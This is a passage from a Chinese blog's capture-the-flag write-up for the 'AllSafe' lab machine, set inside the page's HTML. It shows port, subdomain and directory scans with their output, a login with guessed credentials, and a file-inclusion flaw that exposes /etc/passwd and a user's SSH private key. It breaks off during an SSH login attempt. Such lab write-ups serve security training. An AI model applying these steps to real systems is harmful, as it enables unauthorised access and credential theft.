<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/fZfIvGZ7IygHEm6klVvEz/_buildManifest.js" defer=""></script><script src="/_next/static/fZfIvGZ7IygHEm6klVvEz/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsAllSafe","contentHtml":"\u003ch1\u003eAllSafe\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/139\"\u003ehttps://labs.thehackerslabs.com/machine/139\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00036\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n\u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  EtherNetIP-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18.73\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe nmap -sT -A -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e       \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00056\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e9.2\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e+deb12u3 (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e af:\u003cspan class=\"hljs-number\"\u003e79\u003c/span\u003e:a1:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e:fb:b7:cb:\u003cspan class=\"hljs-number\"\u003e86\u003c/span\u003e:fd:8b:\u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e:4a:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e 6d:d4:9d:ac:0b:f0:a1:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e66\u003c/span\u003e:b4:ff:f6:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:bb:f2:e5 (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.65\u003c/span\u003e ((Debian))\n|_http-title: Allsafe\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.65\u003c/span\u003e (Debian)\n\u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003ep2 Debian \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.19\u003c/span\u003e, OpenWrt \u003cspan class=\"hljs-number\"\u003e21.02\u003c/span\u003e (Linux \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e)\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.56\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22.48\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e80 端口，域名是 \u003ccode\u003eallsafe.thl\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描，扫出来的东西太多就不放出来了，也没什么可以看的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e主站中还有一个功能，可以提交网址，所以索性测试了 SSRF，但是没有触发，但是测试 \u003ccode\u003elocalhost\u003c/code\u003e 的时候返回了 \u003ccode\u003e1234565even\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e后面没找到其他的东西\u003c/p\u003e\n\u003cp\u003e尝试子域名爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe ffuf -u \u003cspan class=\"hljs-string\"\u003e'http://allsafe.thl/'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'host:FUZZ.allsafe.thl'\u003c/span\u003e -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-\u003cspan class=\"hljs-number\"\u003e110000.\u003c/span\u003etxt -fs \u003cspan class=\"hljs-number\"\u003e7016\u003c/span\u003e\n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://allsafe.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.allsafe.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 7016\n________________________________________________\n\nintranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到子域名 \u003ccode\u003eintranet\u003c/code\u003e ，访问，登录需要员工 ID 格式为 \u003ccode\u003ex-xxx-xxxx\u003c/code\u003e ，密码估计就是上边的得到的 \u003ccode\u003e123456Seven\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行信息收集，目录爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e -u http://intranet.allsafe.thl/                    \n===============================================================\nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://intranet.allsafe.thl/\n[+] Method:                  GET\n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\n[+] Extensions:              php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.php            (Status: \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] [--\u003e login.php]\n/images               (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e329\u003c/span\u003e] [--\u003e http://intranet.allsafe.thl/images/]\n/login.php            (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e2075\u003c/span\u003e]\n/docs                 (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e327\u003c/span\u003e] [--\u003e http://intranet.allsafe.thl/docs/]\n/profile.php          (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e2305\u003c/span\u003e]\n/assets               (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e329\u003c/span\u003e] [--\u003e http://intranet.allsafe.thl/assets/]\n/customers.php        (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e11072\u003c/span\u003e]\n/db.php               (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n/logout.php           (Status: \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] [--\u003e login.php]\n/process              (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e330\u003c/span\u003e] [--\u003e http://intranet.allsafe.thl/process/]\n/views                (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e328\u003c/span\u003e] [--\u003e http://intranet.allsafe.thl/views/]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看到有 \u003ccode\u003ecustomers.php\u003c/code\u003e ，进行查看，得到很多的员工信息，但是并没有员工 ID\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后在主站的 “我们的团队” 中找到了类似员工 ID 的东西\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e0-477-9990\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试登录 \u003ccode\u003e0-477-9990\u003c/code\u003e:\u003ccode\u003e123456Seven\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e后台尝试寻找可利用的点\u003c/p\u003e\n\u003cp\u003e点击 \u003ccode\u003eContrato\u003c/code\u003e 可以查看合同\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前在 \u003ccode\u003eprocess\u003c/code\u003e 目录中\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在其中的一个文档中还能翻到 \u003ccode\u003e/etc/passwd\u003c/code\u003e 的输出\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看其 tex 文件，可以看到 \u003ccode\u003eEmpresa\u003c/code\u003e 参数可以进行文件包含\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中还有一个读取了 \u003ccode\u003eSSH\u003c/code\u003e 私钥的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看到读取的是 \u003ccode\u003e/home/parker/.ssh/id_rsa\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e任意文件读取\u003c/h3\u003e\n\u003cp\u003e将 \u003ccode\u003ePDF\u003c/code\u003e 上的 \u003ccode\u003eid_rsa\u003c/code\u003e 进行修复\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 假设文件是 key.txt\u003c/span\u003e\ncat id_rsa | grep -v \u003cspan class=\"hljs-string\"\u003e\"PRIVATE KEY\"\u003c/span\u003e | tr -d \u003cspan class=\"hljs-string\"\u003e' \\n'\u003c/span\u003e | fold -w \u003cspan class=\"hljs-number\"\u003e70\u003c/span\u003e \u003e fixed_key_body.txt\n\u003cspan class=\"hljs-comment\"\u003e# 然后加上头尾\u003c/span\u003e\necho \u003cspan class=\"hljs-string\"\u003e\"-----BEGIN OPENSSH PRIVATE KEY-----\"\u003c/span\u003e \u003e fixed_key.txt\ncat fixed_key_body.txt \u003e\u003e fixed_key.txt\necho \u003cspan class=\"hljs-string\"\u003e\"-----END OPENSSH PRIVATE KEY-----\"\u003c/span\u003e \u003e\u003e fixed_key.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是貌似不起效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe ssh parker@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e -i fixed_key.txt -p \u003cspan 